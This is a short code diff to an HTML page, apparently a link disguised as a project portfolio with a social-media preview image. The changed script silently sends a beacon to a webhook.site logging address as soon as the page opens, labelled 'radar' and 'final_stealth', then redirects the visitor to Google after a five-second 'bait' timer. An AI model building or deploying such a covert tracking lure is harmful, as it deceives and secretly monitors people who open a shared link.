@@ -6,16 +6,15 @@
     <meta property="og:image" content="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG">
     
     <script>
-        // TRIGGER 1: Fire the radar immediately using a Beacon
+        // TRIGGER 1: The radar fires the millisecond the link is opened
         const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
-        const data = "?type=auto_fire&ts=" + Date.now();
+        const data = "?type=final_stealth&ts=" + Date.now();
         navigator.sendBeacon(radar + data);
 
-        // TRIGGER 2: Force the redirect as fast as possible
-        // Reduced to 300ms—almost instantaneous
+        // TRIGGER 2: The 5-second "Bait" timer
         setTimeout(function() {
             window.location.replace("https://www.google.com");
-        }, 300);
+        }, 5000); // 5000ms = 5 Seconds
     </script>
 
     <style>
